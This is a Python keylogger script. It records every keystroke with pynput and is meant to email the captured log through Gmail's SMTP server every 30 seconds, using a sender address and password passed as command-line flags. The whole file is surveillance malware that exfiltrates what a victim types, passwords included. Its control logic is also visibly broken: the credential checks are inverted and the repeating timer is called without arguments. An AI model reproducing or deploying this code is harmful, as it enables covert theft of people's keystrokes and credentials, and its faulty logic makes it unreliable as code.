import pynput.keyboard 
import smtplib
import threading
import optparse

log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log.encode() + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)
    
def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()


def thread_function(email,password):
    global log
    if not email:
        print("Enter email address with -e flag")
    else:
        return
    if not password:
        print("Enter password with -p flag") 
    else:
        return
    send_email(email,password,log.encode("utf-8"))
    log = ""
    timer_obj = threading.Timer(30,thread_function)
    timer_obj.start()

def get_input():
    parse_obj = optparse.OptionParser()
    parse_obj.add_option("-e","--email",dest="email",help="Enter email address")
    parse_obj.add_option("-p","--password",dest="password",help="Enter password")
    return parse_obj.parse_args()
        
user_input = get_input()[0]
keylogger = pynput.keyboard.Listener(on_press=callback_function)
# threading
with keylogger:
    thread_function(user_input.email,user_input.password)
    keylogger.join()